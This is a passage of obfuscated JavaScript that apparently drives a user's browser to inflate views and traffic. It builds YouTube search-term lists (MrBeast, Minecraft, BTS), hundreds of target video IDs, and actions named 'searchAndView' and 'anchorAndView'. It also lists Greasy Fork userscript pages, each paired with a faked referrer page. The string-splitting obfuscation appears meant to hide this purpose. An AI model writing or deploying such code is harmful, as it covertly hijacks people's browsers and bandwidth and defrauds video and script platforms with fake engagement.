'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + Z(0x11) + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x148d * 0x1 + -0x1bcc + 0x749)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x4b2 + 0x10d7 + -0xc1b)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1448 + 0x1 * 0xcdb + 0x5 * -0x6a0);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    X(0x16, 'c6[[') + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    Z(0xa) + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    Z(0x8) + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + X(0x17, 'PS@S') + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + Z(0x2) + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
